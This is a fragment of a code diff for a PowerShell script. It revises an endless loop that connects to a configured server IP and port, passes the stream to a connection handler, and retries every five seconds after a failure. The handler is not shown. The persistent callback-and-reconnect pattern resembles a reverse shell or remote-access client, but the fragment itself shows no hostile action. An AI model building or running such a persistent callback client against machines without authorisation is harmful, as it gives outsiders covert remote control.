+        Write-Host "Failed to reconnect. Exiting..."
     }
 }
 
@@ -566,23 +639,25 @@ function Show-SuccessMessage {
     $form.ShowDialog()
 }
 
-# Main connection loop with improved error handling
+# Main connection loop with improved reconnection
 while ($true) {
+    $shouldContinue = $false
+    
     try {
-        Write-Host "Attempting to connect to server..."
+        Write-Host "Attempting to connect to $server_ip on port $server_port..."
         $client, $stream = Connect-ToServer -server_ip $server_ip -server_port $server_port
         
         if ($client.Connected) {
             Write-Host "Connected to server. Handling connection..."
             Handle-Connection -client $client -stream $stream
         }
-        
-        Write-Host "Connection lost. Attempting to reconnect..."
     }
     catch {
         Write-Host "Connection error: $_"
+        $shouldContinue = $true
     }
     finally {
+        # Cleanup
         if ($client) {
             try { 
                 $client.Close() 
@@ -596,8 +671,12 @@ while ($true) {
             } catch { }
         }
         
-        # Wait before retry
-        Write-Host "Waiting 5 seconds before reconnection attempt..."
+        Write-Host "Connection lost. Waiting 5 seconds before reconnection attempt..."
         Start-Sleep -Seconds 5
+    }
+    
+    # Continue loop outside the finally block
+    if ($shouldContinue) {
+        continue
     }
 }
